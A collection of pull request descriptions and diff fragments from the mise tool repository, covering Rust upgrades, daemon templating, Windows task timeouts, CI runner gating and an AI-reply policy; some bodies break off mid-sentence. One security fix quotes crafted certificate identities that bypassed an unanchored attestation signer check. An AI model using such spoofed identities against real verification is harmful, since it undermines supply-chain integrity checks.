title: fix(rust): upgrade stable and beta when rustup reports an update
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/386
<!-- entire-trail-link-end -->

## Summary

With `rust = "stable"`, `mise upgrade rust` and `mise outdated rust` reported nothing to do even when `rustup check` listed a newer stable toolchain, and once detection is fixed the upgrade still would not install it. This fixes both halves so `mise upgrade rust` actually moves `stable` (and `beta`) forward.

```toml
[tools]
rust = { version = "stable", profile = "minimal" }
```

```text
$ rustup check
stable-aarch64-apple-darwin - update available: 1.98.1 (48a229cea 2026-09-01) -> 1.99.0 (b940084d7 2026-09-28)
rustup - up to date : 1.29.1
```

Before:

```text
$ mise upgrade rust --dry-run
mise All tools are up to date
```

After:

```text
$ mise upgrade rust --dry-run
Would install rust@stable
$ mise upgrade rust      # runs `rustup toolchain install stable`
```

## What changed

- **Detection (rustup 1.29).** rustup 1.29 changed the status text from `Update available : ` to `update available: ` (rust-lang/rustup#4568) and mise only matched the old spelling. Both are accepted now, and only the line for the toolchain mise manages counts, so an update to nightly or to rustup itself is not reported as a stable update. This is kohjunhao's work from #13897, kept as the first commit.
- **The upgrade now installs.** `mise upgrade` installs without `--force`, and a `stable` toolchain whose install symlink exists counts as installed, so detection alone made `--dry-run` say "Would install" while the real upgrade skipped it as "already installed". For the `stable` and `beta` channels mise now asks `rustup check` before treating an existing install as satisfied (via `is_rolling_version_outdated`), so the channel is reinstalled when rustup reports an update. The toolchain is updated in place (a new `updates_rolling_version_in_place` backend hook skips the uninstall), so a failed install leaves the old toolchain usable for every project sharing the rustup home, and mise puts its install link back if the update fails. `rustup check` still runs only from the outdated check; the install that follows reuses its answer, so installing or listing an installed channel never goes to the network.
- **Host-qualified names.** The toolchain used to be looked up as `<version>-<mise build target>`. It is now looked up under the configured `rust.default_host`, then mise's build target, and a request that is already host-qualified (`stable-x86_64-pc-windows-gnu`) is used as is. If rustup was initialized for yet another host, the channel's only host-qualified listing is used.

Pinned releases (`1.99.0`) and dated nightlies are unchanged.

## Validation

- Unit tests cover both rustup spellings, other-toolchain-only updates, and the host/channel helpers.
- New e2e `core/test_rust_stable_upgrade` drives a fake rustup that reports the 1.29-style update under a configured `rust.default_host` that differs from the build target: nothing happens while only nightly is

+mise install

+
+# Neither reinstalling something installed nor listing it asks rustup for updates.
+mise install rust
+mise ls rust >/dev/null
+assert "! grep -q '^check' '$STATE/rustup.log'"

+# Up to date: only nightly is outdated, which must not count against stable.

+mise upgrade rust
+assert_contains "grep -c '^toolchain install stable' '$STATE/rustup.log'" "1"
+
+# rustup 1.29 reports a stable update: mise sees it and reinstalls the channel.
+touch "$STATE/update_available"
+assert_contains "mise upgrade rust --dry-run" "Would install rust@stable"

+# A failed update must leave the installed toolchain linked and usable.

+MISE_ALWAYS_KEEP_INSTALL=1 assert_fail "mise upgrade rust"
+assert "test -L '$MISE_DATA_DIR/installs/rust/stable'"

+rm "$STATE/fail_install"

title: fix(daemons): render env and vars in daemon commands at launch
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/385
<!-- entire-trail-link-end -->

Fixes #13891.

A daemon command that referenced mise's `[env]` or `[vars]` failed to start:

```toml
[vars]
test_var = "test_var_value"

[daemons.test-var]
run = "exec echo '{{ vars.test_var }}'"
```

```
pitchfork ERROR Template render error ...: Variable `vars` is not defined. Available variables: daemons, dir, host, id, name, ...
```

Pitchfork renders `run` before it launches the `mise x` wrapper, so it never sees mise's config. Mise now finishes the job at launch. When pitchfork passes a command through unrendered, `mise x` renders it with the project's `[env]`, `[vars]` and all of mise's template filters (such as `quote`), plus pitchfork's own variables:

```toml
[env]
GREETING_SUFFIX = "!"

[vars]
greeting = "it's"

[daemons.hello]
run = "exec echo {{ vars.greeting | quote }}{{ env.GREETING_SUFFIX }} from {{ name }}"
```

The daemon prints `it's! from hello`, and `{{ name }}` still comes from pitchfork.

Why this shape: mise `[env]` can hold decrypted secrets, so it is never copied into the generated pitchfork file, and mise does not scan the template text to decide which tags are its own. Rendering happens in the daemon's own directory, so it uses that project's vars, including for a daemon a parent project declares.

Requirements and limits:
- Needs the pitchfork change in jdx/pitchfork#966, so a pitchfork release newer than 2.29.0. With an older pitchfork the failure above remains.
- Applies to `run` only; `env`, hooks and the ready/health fields still use pitchfork's variables.
- `mise x` reads the context from `PITCHFORK_TEMPLATE_CONTEXT` (JSON), removes it from the command's environment, and only renders when it is set; `mise x` called elsewhere is unchanged.

Tests: new e2e `test_exec_pitchfork_template_context` covers env/vars/pitchfork variables, the variable not leaking to child processes, and render errors. I also ran the issue's reproduction against a local build of the pitchfork PR end to end (`test_env_value test_var_value t`). The daemons unit tests and clippy pass. Docs updated in `docs/daemons.md`.

> [!NOTE]
> **Medium Risk**
> Changes `mise x` argument handling when pitchfork sets `PITCHFORK_TEMPLATE_CONTEXT`, including env merge semantics and child env stripping; depends on a new pitchfork release but ordinary `mise x` is unchanged without that variable.
> 
> **Overview**
> **Daemon `run` commands can use mise `[env]` and `[vars]` templates** that pitchfork cannot render alone. When pitchfork passes an unrendered command via `PITCHFORK_TEMPLATE_CONTEXT` (JSON), `mise x` merges that context with the project toolset Tera context, renders `{{ … }}` in the program and arguments (including filters like `quote`), then strips the variable

title: fix(brew-cask): stop reinstalling pkg casks whose uninstall ids span architectures
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/384
<!-- entire-trail-link-end -->

`mise bootstrap packages install` reinstalled pkg-based `brew-cask` packages such as `google-drive` on every run, even though they were installed and had a current mise receipt. `--dry-run` always planned `install cask google-drive/...`.

**Cause.** The receipt recorded every id from the cask's `uninstall pkgutil` list, and the installed check required all of them to be registered. Homebrew treats that list as "ids to remove if present", so it can include other architectures or optional components. For google-drive on Apple silicon, only `com.google.drivefs.arm64` and `com.google.drivefs.shortcuts` register, so the `x86_64` and FUSE ids made the cask report missing forever.

**Fix.** When the receipt is written, each declared pattern is resolved with `pkgutil --pkgs=<pattern>` and only the patterns that matched an installed receipt are stored (the patterns, not the expanded ids, so a self-updating package that replaces a receipt with a newer matching id is still found). The all-must-exist check is unchanged, but now runs against patterns that can match on this machine. If no pattern matches, the declared list is kept so an unverifiable install is still reported missing.

Receipts written by earlier versions keep the full list, so an affected cask is reinstalled once on the next `mise bootstrap packages install`, which writes a corrected receipt.

Validated with new unit tests (google-drive id set, wildcard pattern retention, no-match fallback, receipt round-trip) and the existing cask tests. Not exercised against a real pkg install.

Fixes #13890

*AI-assisted — Tool: Claude Code; model: anthropic/claude-sonnet-5-5; version: unavailable.*

> [!NOTE]
> **Medium Risk**
> Changes how installed pkg casks are detected via receipt `pkg_ids`; one-time reinstall may occur for receipts written by older mise, but logic is scoped to macOS pkgutil receipt matching.
> 
> **Overview**
> Fixes **repeat reinstalls** of pkg-based brew casks (e.g. `google-drive`) when mise thought the install was missing even though a receipt existed.
> 
> **Receipt writing** now stores only the cask’s declared `uninstall pkgutil` **patterns that actually match** a registered macOS receipt after `.pkg` install (`pkgutil --pkgs=<pattern>`), not the full cross-arch/optional list Homebrew uses for uninstall. Patterns are kept (not expanded IDs) so self-updating packages still verify; if nothing matches or a lookup fails, behavior falls back to the declared list so “missing” is not silently hidden.
> 
> Install makes `artifacts` mutable and runs this resolution when any pkgs were installed. **`pkgutil_matching_ids_checked`** distinguishes “command failed” (`None`) from “no matches” to support that filtering. New unit tests cover resolution edge cases and receipt persistence.

title: fix(release): back up alpine bump to GitHub and allow SSH push to GitLab
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/383
<!-- entire-trail-link-end -->

The `release-alpine` job for v2026.10.0 spent 38 minutes building the apks, then failed on `git push` to `gitlab.alpinelinux.org` with an HTTP 418. Alpine's `go-away` bot-challenge proxy blocks git-over-HTTPS from CI IP ranges, so the Alpine package bump (and its GitLab MR) never went out. The same thing failed v2026.8.0, v2026.8.10, v2026.9.0 and v2026.9.10; [#13286](https://github.com/jdx/mise/pull/13286) worked around the clone but not the push.

This makes the push avoid the challenge, and makes a failure cheap to recover from:

- **SSH push.** When the `ALPINE_GITLAB_SSH_KEY` secret is set, the script pushes to `jdxcode/aports` over SSH with a pinned ed25519 host key. The proxy only fronts HTTP; sshd is separate. Without the secret, behavior is unchanged (HTTPS with the token).
- **GitHub backup.** Before pushing to GitLab, the bump is pushed to `mise-<version>` on `github.com/jdx/aports` (a fork of `alpinelinux/aports`). Best effort: a failure only warns.
- **Retries.** The GitLab push is tried 3 times (1 and 2 minute backoff), since the block has come and gone before.
- **Recovery output.** If all attempts fail, the job errors with the exact commands to finish by hand from the GitHub branch (clone, create local `mise` branch, push to GitLab over SSH, `glab mr create`), or says to re-run if the backup push failed too. No more 40 minute rebuild.
- Credentials (SSH key write, token-bearing backup remote) are kept out of `set -x` output.

## Setup already done
- `jdx/aports` fork exists; `mise-en-dev` has write access, and the workflow's `MISE_GH_TOKEN` is used for the backup push.
- A write deploy key is registered on `jdxcode/aports` and its private half is stored as `ALPINE_GITLAB_SSH_KEY` in this repo. Verified from a laptop: `git ls-remote` and the receive-pack advertisement succeed with it, and the host key matches the pinned one.

## Not verified
- SSH from GitHub's runner IPs, and `glab mr create` (HTTPS API with the token) from CI, haven't run since the 418. Needs a `workflow_dispatch` with `dry_run=false` after merge, then a re-run for v2026.10.0.

+	# Keep a copy of the bump on GitHub first. gitlab.alpinelinux.org may answer
+	# the push below with an HTTP 418 anti-bot challenge from CI IP ranges; the
+	# build takes ~40 minutes, so this lets someone finish the push from a
+	# machine GitLab accepts instead of re-running the whole job. Best effort:
+	# a failure here must not block the real push.
+	{ set +x; } 2>/dev/null

+	set -x
+	backup_branch="mise-${MISE_VERSION#v}"

+	if git push backup "HEAD:refs/heads/$backup_branch" -f; then
+		backup_ok=1
+	else
+		echo "::warning::could not push $backup_branch to github.com/$ALPINE_BACKUP_REPO"
+	fi
+
+	pushed=0
+	for attempt in 1 2 3; do
+		if git push jdxcode -f; then
+			pushed=1
+			break
+		fi
+		echo "git push to gitlab.alpinelinux.org failed (attempt $attempt/3)"
+		if [ "$attempt" -lt 3 ]; then
+			sleep $((attempt * 60))
+		fi
+	done
+	if [ "$pushed" == 0 ]; then
+		echo "::error::could not push to gitlab.alpinelinux.org/jdxcode/aports (likely an HTTP 418 bot challenge on CI IPs)."
+		if [ "$backup_ok" == 1 ]; then
+			cat <<EOF
+The bump is committed at github.com/$ALPINE_BACKUP_REPO branch $backup_branch. To finish by hand:
+  git clone --branch $backup_branch --single-branch https://github.com/$ALPINE_BACKUP_REPO.git aports
+  cd aports && git checkout -b mise
+  git push git@gitlab.alpinelinux.org:jdxcode/aports.git mise -f
+  GITLAB_HOST=gitlab.alpinelinux.org glab mr create --fill --yes -H jdxcode/aports -R alpine/aports
+EOF
+		else
+			cat <<EOF
+The GitHub backup push also failed, so the commit only existed in this job. Re-run the job, or
+bump community/mise/APKBUILD (pkgver, then abuild checksum) by hand and push it to jdxcode/aports.
+EOF
+		fi
+		exit 1
+	fi

title: fix(task): send Ctrl+C to a timed-out task on Windows before terminating it
body:
On Windows, a task that hit its `timeout` was terminated at once with `taskkill /F /T`, so it never got to clean up: a PowerShell `finally` block didn't run, and a server couldn't shut down cleanly. On Unix the same timeout sends SIGTERM and waits 5 seconds before SIGKILL.

Now a timed-out task on Windows first gets Ctrl+C, and its process tree is terminated only if it is still running 5 seconds later:

```toml
[tasks.slow]
run = "pwsh -NoProfile -File slow.ps1"   # try { ... } finally { cleanup }
timeout = "20s"
```

After 20 seconds the `finally` block in `slow.ps1` runs and `mise run slow` fails with `timed out after 20s`. Before, the `finally` block never ran.

Only the timed-out task receives the Ctrl+C. Other tasks running in the same `mise run`, and mise itself, do not.

### How

Windows can't send Ctrl+C to one process, only to a console or to a process group. A process started in a new process group ignores Ctrl+C by default, which would also stop the user's own Ctrl+C from reaching the task. So a command that has a timeout now starts through a small leader: mise re-runs itself with a hidden `__ctrl-c-group` argument in a new process group. The leader clears the "ignore Ctrl+C" flag, runs the command in a job object, and exits with its exit code. On timeout, mise sends `CTRL_C_EVENT` to that group.

Commands without a timeout start as before, and so do commands mise only reads output from, since nothing sends them Ctrl+C. A command started this way takes about 10–11 ms longer to start, mostly the time mise.exe takes to load before `main` (12.6 ms, against 8.3 ms for `cmd /c` itself). These were measured on a GitHub `windows-latest` runner over 3 × 31 rounds.

Details:

- If the task exits on the Ctrl+C but something it started ignores it, the leader terminates the job, so that process does not outlive the task. A task that exits without receiving Ctrl+C leaves what it started running, as before.
- If the task is still running 5 seconds after the Ctrl+C, the process tree is terminated as before, and so is everything in the job, including a descendant whose parent has already exited, which `taskkill /T` cannot find. This is needed: `cmd.exe` stops at `Terminate batch job (Y/N)?` when a batch file gets Ctrl+C, and Git's `sh` ignores it.
- If the Ctrl+C can't be sent, for example because mise has no console, the tree is terminated immediately.
- A task that exits with status 0 after the Ctrl+C still counts as timed out.
- The whole-run `mise run --timeout` still terminates running tasks immediately on Windows.

Alternatives I tried and ruled out:

- Sending Ctrl+C to the whole console also reaches mise and every other task.
- `CREATE_NEW_PROCESS_GROUP` without the leader makes the task ignore the user's Ctrl+C.
- Ctrl+Break can be sent to one group, but PowerShell enters its debugger on it.

Microsoft's documentation says `CTRL_C_EVENT` cannot be sent to a process group. In practice it is delivered to the group once the group has cleared the

title: ci: run trusted Windows jobs on a self-hosted runner
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/382
<!-- entire-trail-link-end -->

Trusted Windows CI can now run on a dedicated machine with a 16-core Ryzen 9 9950X and 64 GB of RAM, instead of 4-vCPU `windows-latest` runners. Untrusted runs and arm64 builds are unchanged.

## What changes

- **Runner selection.** For trusted runs (the same `jdx` / `mise-en-dev` rule `test.yml` already uses), `build-windows`, `windows-unit`, `windows-lint` and the x64 `build-tarball-windows` job target `[self-hosted, jdx-win-trusted-v1]`. Everything else keeps `windows-latest` / `windows-11-arm`. `windows-e2e` deliberately stays on `windows-latest`: on the runner, 13 of ~310 tests failed because they need an interactive desktop, Task Scheduler or a user-level logon that a runner service cannot provide (console-window and scheduled-task tests), and the suite is not compile-bound, so there was little to gain.
- **Kill switch.** Jobs only use the machine while the repository variable `WINDOWS_SELF_HOSTED` is `true`. Unset (the default), every Windows job runs on hosted runners exactly as today, so merging this is safe while the machine is offline, and flipping the variable off is the one-step fallback.
- **Shared build cache.** Trusted build, test and lint jobs call `mbx build|test|clippy` against one shared local store on the machine. This needs mbx 1.21.1, which caches Windows proc-macros and build scripts linked with `-C link-arg=/STACK:...` (mr-boxington#619); `mise.lock` pins that version.
- **Release rule.** Only the release PR's dry run may use the cache. A real release (tag push or manual dispatch) sets `MBX_DISABLE=1` and always compiles from scratch with plain cargo, so a bad cache entry can never reach a shipped artifact. `scripts/build-tarball.ps1` only switches to `mbx` when `MBX_DISABLE=0` and `mbx` exists.
- **Fat LTO on Windows x64 releases.** `scripts/build-tarball.ps1` forced thin LTO because the hosted runner could not finish a fat link inside the job timeout. It now forces thin only on machines with under 48 GB of RAM, so the self-hosted runner builds with the `serious` profile's default fat LTO like the other platforms. Hosted runners keep thin.

## Why this is safe to run on a public repo

A repository-scoped runner can be selected by any workflow, including one edited in a fork's pull request, so the machine does not rely on workflow YAML. A host-side `ACTIONS_RUNNER_HOOK_JOB_STARTED` hook runs before any step and refuses everything except: repository `jdx/mise`; both the actor and the triggering actor being `jdx` or `mise-en-dev`; protected refs (`main`, `release`, `mise`, `v*` tags) for push, dispatch and schedule events; or a pull request from this repository with a trusted author. It fails closed, runs as an unprivileged account that cannot log in, and the runner account cannot modify the hook. I tested the hook against simulated outsider fork PRs, a maintainer re-running or pushing to an outsider's fork, a deleted

title: fix(exec): keep double quotes in a positional cmd /c command on Windows
body:
This reopens #13755, which the draft limit closed; that pull request has the earlier review discussion.

On Windows, a command passed to `cmd /c` as an argument lost its double quotes: `mise exec -- cmd /c 'echo "a b"'` printed `\"a b\"`. mise hands the command to cmd with the standard argument quoting, which escapes each `"` as `\"`, and cmd does not understand that escape.

This is how pitchfork runs a daemon with `mise = true`: `mise x -- cmd /C <run>`. So on Windows any such daemon whose `run` contains a double quote failed to start, for example one that quotes a program path with a space:

```toml
[daemons.api]
run = '"C:\Program Files\api\api.exe" --title "a b"'
mise = true
```

Before, pitchfork reported the daemon as `errored`, and its log showed cmd rejecting `'\"C:\Program Files\api\api.exe\"'` as an unknown command. Now it starts. pitchfork documents this as a known limitation of `mise = true`, which this change removes on the mise side.

mise now passes the command to cmd verbatim, the way it already does for `mise exec -c` (#9355), when all of these hold:

- the program is `cmd`
- the command is the one argument right after `/c` or `/k`, with only switches before it
- the command contains a double quote

Anything else is unchanged. A command without a double quote already reaches cmd intact; a path with a space, such as `cmd /c "C:\Program Files\app.exe"`, relies on cmd keeping the two quotes the standard quoting adds and would break if passed verbatim. Several arguments after `/c`, as in `cmd /c "echo one" two`, remain separate arguments.

## Validation

On Windows 11 with a debug build:

- `e2e-win/exec_inner_quotes.Tests.ps1` has three new cases. `mise exec -- cmd /c 'echo "hello world"'` prints `"hello world"`; it printed `\"hello world\"` with mise 2026.9.15. A `.cmd` in a directory with a space, run as `"<path>probe.cmd" "a b"`, now starts and receives `a b`; with mise 2026.9.15 it did not start. A command without quotes still prints as before. The existing cases pass with and without this change.
- pitchfork 2.28.0 with `general.mise_bin` pointing at the build: a `mise = true` daemon whose `run` quotes a mise path containing a space went from `errored` to `running`, and its task ran. A `mise = true` daemon without quotes runs as before.
- `test_positional_cmd_command` covers the conditions above, on every platform.
- `cargo clippy -p mise -p mise-util --all-targets -- -D warnings` on Windows reports nothing in the changed files. CI now runs clippy on Windows too (#13757).

title: docs(contributing): make the restricted AI reply policy and instant ban unmissable
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/381
<!-- entire-trail-link-end -->

mise is seeing a growing number of AI-generated replies on Discussions and Issues from accounts with no connection to the project. This makes the policy impossible to miss for both people and the agents they run.

**The rule:** you may only use AI to reply to a Discussion or Issue if you created it, you opened a PR that fixes it, or you have already had a contribution merged into mise. Everyone else is not allowed to, including with lightly edited, reviewed, or disclosed model output. Doing it is an instant ban across all of jdx's projects.

What changed:

- `AGENTS.md`: a new "Restricted AI Replies" section at the very top, above the registry warning. It tells agents how to verify the user qualifies (thread author, fixing PR, or merged PR via `gh pr list --author @me --state merged`), to refuse and offer an in-chat explanation otherwise, and never to sweep through threads.
- `docs/contributing.md`: a red danger callout at the top of "Community Participation", replacing the old, easy-to-miss paragraphs.
- `CONTRIBUTING.md`: a caution block right under the link to the guide, which is what GitHub shows contributors first.

Creating a Discussion or Issue with AI assistance is explicitly allowed; only replies are restricted.

Docs-only; `hk` markdown checks pass.

diff:
--- AGENTS.md (+18/-8)
@@ -4,6 +4,22 @@ This file is the canonical agent guide. `CLAUDE.md` is a symlink to `AGENTS.md`
 
 Task-specific procedures live as skills in `.agents/skills/` (`.claude/skills` is a symlink to it). Load the named skill when this guide points to one; agents without skill support can read its `SKILL.md` directly.
 
+## Discussions and Issues: Restricted AI Replies
+
+**Do not use AI to reply to a mise Discussion or Issue unless the user (a) created that Discussion or Issue, (b) opened a PR that fixes it, or (c) has already had a contribution merged into the default branch of mise.** Otherwise they are not allowed to use AI to respond to it. Drive-by AI replies are spam, the problem is getting worse, and **doing it is an instant ban across all of jdx's projects** (mise, hk, pitchfork, usage, fnox, and the rest).
+
+- If the user asks you to answer, comment on, or "help with" a Discussion or Issue, confirm one of the three conditions first. If you cannot confirm one, **do not post**.
+  - (a) Compare the thread author to the authenticated user (`gh api user --jq .login`). For an Issue, use `gh api repos/jdx/mise/issues/<number> --jq .user.login`. Discussions have no REST endpoint, so use GraphQL: `gh api graphql -f query='query{repository(owner:"jdx",name:"mise"){discussion(number:<number>){author{login}}}}' --jq .data.repository.discussion.author.login`.
+  - (b) Check that the user's PR actually fixes the problem described in the thread. A closing keyword such as `Fixes #<number>` is good evidence, but a link is not required, and a PR that merely mentions an unrelated thread does not count.
+  - (c) Look for any contribution merged into the default branch that is tied to the user's GitHub account, not just a matching name or email: a PR authored by the user that was merged into the default branch (`gh pr list --repo jdx/mise --author @me --state merged --base main --limit 1`), commits on the default branch that GitHub attributes to their login (`gh api 'repos/jdx/mise/commits?author=<login>&per_page=1'` lists the default branch), never commits on a local or unmerged branch, or a PR from someone else, merged into the default branch, that credits them with a `Co-authored-by` trailer whose email is their GitHub noreply address or one verified on their account. Do not accept `git log --author` output, which includes local unmerged commits, or a trailer matched only by display name. Both queries filter by author on the server, so one matching result is enough to qualify and no pagination is needed.
+- If none of the three apply, **do not post a reply, even a short one.** Tell them this project does not allow AI replies from people who have not contributed, and offer to explain the answer to them in chat instead.
+- Never batch-post, loop over, or sweep Discussions or Issues to answer several of them, even for a merged contributor.
+- Lightly edited, human-reviewed, or disclosed model output does not create an exception. The disclosure footer does not make an AI reply acceptable on its own.
+- Permitted replies may be AI-assisted. The user must review and verify the reply before it is posted.
+- Creating a new Discussion or Issue with AI assistance is fine and is not restricted. The user must review it before it is posted, and it needs the AI disclosure below.
+
+When you post AI-contributed GitHub content, including a new Discussion or Issue, a reply, or a PR description or comment, append this disclosure: `*AI-assisted — Tool: <tool>; model: <provider>/<model>; version: <version-or-unavailable>.*` Use the exact model and version identifiers exposed by the runtime, never guessed values, and `unavailable` when one is not exposed.
+

title: fix(packslip): retry missing declared skills
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/380
<!-- entire-trail-link-end -->

A Packslip install can successfully extract its executable yet fail to fetch a declared skill, for example when GitHub's contents API is temporarily unavailable. mise previously reported that install as complete and skipped it on a later plain `mise install`.

This keeps the usable binary in place but leaves the install incomplete and returns an error when a fetch-enabled declared skill remains unavailable after all applicable sources have been tried. A later plain `mise install` repairs just the missing declared skills in place. Shipped skills, successful fallback sources, `skills.fetch = false`, exec-only skills with `packslip.exec = false`, unrelated optional resources, and integrity failures retain their existing behavior.

The regression coverage exercises failed staging cleanup, fallback satisfaction, and intentionally disabled skill sources.

Validation: `git show --check` passed. Repository tests were not run locally because the approved disposable VM could not receive the checkout through its network policy; CI is pending.

*AI-assisted — Tool: Codex; model: OpenAI/GPT-5; version: unavailable.*

<!-- CURSOR_SUMMARY -->
---

> [!NOTE]
> **Medium Risk**
> Changes core install/repair satisfaction and completion semantics for Packslip tools; mistakes could cause spurious reinstalls, skipped repairs, or postinstall deadlocks, though behavior is heavily tested.
> 
> **Overview**
> Packslip installs no longer treat a successful binary extract as fully done when **declared skills** are still missing. The shared install flow adds a **`verify_install`** step after postinstall hooks (alongside the existing repair path’s **`verify_repaired_install`**) and tightens when in-place **repair** runs so it is skipped under **force**, rolling reinstall, or uninstall.
> 
> The Packslip backend now treats satisfaction as “binary present **and** no required missing skills,” can **repair in place** by re-running resource fetches without reinstalling the artifact, and records skill-only incompleteness via a separate **`.mise-packslip/skills-incomplete`** marker with clearer errors (including when only an archive skill is missing and **`--force`** reinstall is required). Nested **`mise`** calls from postinstall keep the outer **`MISE_TOOL_INSTALL_PATH`** so nested installs do not deadlock on locks.
> 
> Supporting logic in **`packslip`** defines which missing skills count as required vs intentionally skipped (**`skills.fetch`**, exec-only with **`packslip.exec` off**), plus regression tests for retry lifecycle, partial skill staging, and fallback satisfaction.
>

title: fix(aqua): invalidate incompatible compiled registry caches
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/379
<!-- entire-trail-link-end -->

After an upgrade, an older compiled Aqua registry cache can retain a readable index while its archived package blobs no longer match the current layout. Loading that cache later fails when a package is resolved.

This invalidates the previous compiled-cache layout so stale v9 entries are treated as cache misses and rebuilt from the cached registry source. No configuration changes are required.

Addresses https://github.com/jdx/mise/discussions/13878.

Validation:
- `cargo fmt --all -- --check`
- `cargo test -p aqua-registry` (138 passed)
- `cargo clippy -p aqua-registry --all-features --all-targets -- -D warnings`

`mise run format` was also attempted; its repository-wide cargo check is currently blocked by an unrelated pre-existing unreachable-code warning in `crates/mise-util/src/http.rs`.

*AI-assisted — Tool: Codex; model: OpenAI/GPT-5; version: unavailable.*

<!-- CURSOR_SUMMARY -->
---

> [!NOTE]
> **Low Risk**
> Local cache path versioning only; no auth, network, or config behavior changes beyond ignoring stale compiled directories.
> 
> **Overview**
> Fixes post-upgrade failures where an old compiled Aqua registry cache could still look valid while its on-disk package blobs no longer matched the current layout.
> 
> **Compiled cache version** is bumped from `v9` to `v10`, with a note to bump again when the archived index or package layout changes. New compiled entries live under the `v10` path, so legacy `v9` directories are treated as cache misses and rebuilt from the cached registry source instead of being loaded.
> 
> A regression test simulates a corrupt legacy `v9` tree (empty package blob) and asserts `load_compiled` fails while `write_compiled` produces a working cache.
>

title: fix(completions): complete `:task` shorthand for the current config root
body:
In a monorepo, `:task` runs a task in the current config root, but tab completion doesn't offer it.

```console
$ mise run :task:<TAB>
```

Expected:
```
:task:sub-task1
:task:sub-task2
```

Actual: no task candidates. The completion backend answers "complete files", so every shell falls back to file paths.

## Fix

`tasks --usage` and `tasks ls --complete` add a `:name` candidate for each task in the current config root, resolved with `expand_colon_task_syntax`, the function that runs `:task`. Task flags also complete after the shorthand. Output outside a monorepo is unchanged. Aliases get no `:` form.

Covered by the new e2e test `test_task_completion_monorepo_colon`, which fails on `main`.

title: fix(aqua): accept RE2 quoted literals in cosign identity patterns
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/377
<!-- entire-trail-link-end -->

Installing `vfox` (and any other aqua tool whose registry entry pins its signer tag with `\Q…\E`) fails since #13875:

```
$ mise use aqua:version-fox/vfox
mise ERROR Failed to install aqua:version-fox/vfox@latest: cosign bundle-based verification failed:
invalid cosign regular expression "^https://github\.com/version-fox/vfox/\.github/workflows/.+\.ya?ml@refs/tags/\Qv1.0.12\E$": ...
  error: unrecognized escape sequence
```

The aqua registry writes `--certificate-identity-regexp` for Go's RE2, where `\Q…\E` matches the text between them literally. #13875 now compiles those patterns with Rust's `regex` crate, which rejects the escape. This is what turned `test-tool-7` and `registry-ci` red on the 2026.10.0 release PR ([#13858](https://github.com/jdx/mise/pull/13858)).

Before compiling a cosign identity pattern, each `\Q…\E` span is now rewritten to an escaped literal. As in RE2, an unterminated `\Q` quotes through the end of the pattern, and an escaped backslash followed by `Q` is left alone. The signer pin is not loosened: quoted text stays literal, so dots in a version do not match any character.

## Testing

- New `certificate_identity_regexp_supports_re2_quoted_literals` accepts the real signer with a `\Q<tag>\E$` pattern and rejects a different tag, a wildcard-dot lookalike, and an unterminated `\Q`. It fails without the fix with the same `unrecognized escape sequence` error as CI.
- `cargo test -p mise-sigstore`, `cargo clippy -p mise-sigstore --all-targets -- -D warnings` and `cargo fmt --check` pass.
- A debug build installs `aqua:version-fox/vfox@latest` (1.0.12) and runs `vfox --version`.

I did not scan the rest of the aqua registry for other `\Q…\E` entries.

🤖 Generated with [Claude Code](https://claude.com/claude-code)

title: security(backend): anchor signer workflow match for GitHub attestations
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/376
<!-- entire-trail-link-end -->

Follow-up to #13875, which noted that the signer workflow check for GitHub artifact attestations was a separate, still-unanchored path.

GitHub attestation verification compared the expected `signer_workflow` (from the aqua registry or a vfox plugin's `github_signer_workflow`) with `identity.contains(expected)` against the whole certificate identity. The identity is `https://github.com/<owner>/<repo>/<workflow path>@<ref>`, and the signer controls both the file name and the ref, so a signer from the wrong workflow could pass:

```text
expected: .github/workflows/release.yml

accepted before, rejected now:
  https://github.com/evil/tool/.github/workflows/release.yml.evil.yml@refs/heads/main
  https://github.com/evil/tool/.github/workflows/ci.yml@refs/heads/x/.github/workflows/release.yml
```

mise now matches the workflow path (the identity before `@<ref>`) as a trailing run of whole path segments. Both existing forms keep working: a bare `.github/workflows/release.yml` and a repository-qualified `owner/repo/.github/workflows/release.yml`. An empty expected workflow is now rejected instead of matching every identity.

## Behavior changes

- A `signer_workflow` that only matched through a longer file name, a partial leading segment (`release.yml` vs `prerelease.yml`), or text in the ref now fails verification. Values that are a path suffix of the real signing workflow are unaffected.
- An empty `signer_workflow` fails closed.

## Testing

title: fix(task): stop running tasks when mise run --timeout expires
body:
When `mise run --timeout` (or the `task.timeout` setting) expired, mise printed `mise run timed out after …` and exited, but the task that was running could keep going in the background, orphaned. For example, on Windows:

```toml
[tasks.whole_run]
run = "node -e \"setInterval(()=>{},1000)\""
```

```
mise run --timeout 8s whole_run
```

left `cmd.exe` and `node.exe` running after mise exited, and the task never got a chance to stop.

Now the whole-run timeout stops running tasks the same way a per-task `timeout` does: SIGTERM, then SIGKILL after 5 seconds on Unix; `taskkill /F /T` on Windows (graceful stop on Windows is a separate effort). A task that a detached job starts after the timeout is killed as it starts.

This reopens #13683 from another account; see that pull request for the earlier review discussion.

### Why it leaked

The timeout only dropped the run's future. The task jobs it had spawned kept running on their own, so nothing stopped their processes. Whether they happened to be killed depended on how mise printed the error:

- With debug logging, `--verbose`-style errors, or any debug build (`MISE_FRIENDLY_ERROR` off), nothing killed them.
- With the default friendly error, the exit path sent SIGTERM (Windows: `taskkill`) to the processes running at that moment. On Unix a task that ignores SIGTERM survived, and on either platform a process a detached job started after that point was missed.

### Validation

New regression tests check that the task's process is gone after `mise run --timeout` returns: `e2e/tasks/test_task_timeout` (a task that ignores SIGTERM, and a background child that ignores SIGTERM after its shell exits) and `e2e-win/task_run_timeout.Tests.ps1` (a PowerShell grandchild of mise). Against released binaries they fail:

- Windows, mise 2026.9.14: `Expected $null or empty, but got System.Diagnostics.Process (powershell).`
- Linux container, mise 2026.8.3: both Unix cases fail (`ERROR: task process … outlived mise run --timeout`), 3/3 runs each with `MISE_FRIENDLY_ERROR=0`, and also with the default friendly error.

